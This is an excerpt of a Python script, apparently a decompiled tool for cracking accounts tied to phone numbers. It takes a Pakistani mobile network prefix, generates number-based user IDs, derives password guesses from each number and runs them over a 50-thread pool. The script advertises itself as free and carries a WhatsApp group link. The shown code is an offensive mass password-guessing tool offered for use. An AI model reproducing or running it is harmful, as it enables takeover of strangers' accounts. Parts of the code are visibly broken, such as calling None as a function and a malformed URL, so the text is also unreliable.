...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] JOIN MY WATSUP GROUP')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https:/https://chat.whatsapp.com/L9VhKO5zbk5BrK7RmEUltu')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def i():
    ...
    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m Jazz92301, \033[1;33mZong92312 ,\033[1;33mufone92333 ,\033[1;33mTelenor92345  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    code = input(' PUT CODE : ')
    print("")
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;31m This tools is free so keep fucking')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
